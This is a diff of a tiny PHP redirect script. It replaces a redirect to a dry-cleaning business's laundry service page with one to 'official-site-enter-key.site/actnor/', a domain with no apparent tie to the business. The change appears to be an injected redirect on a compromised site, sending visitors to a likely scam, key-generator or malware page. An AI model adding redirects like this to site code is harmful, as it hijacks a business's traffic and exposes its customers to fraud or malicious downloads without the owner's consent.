@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.cdonepricecleaners.com/wash-fold-laundry-service/");
+header("Location: https://official-site-enter-key.site/actnor/");
 die();
 ?>
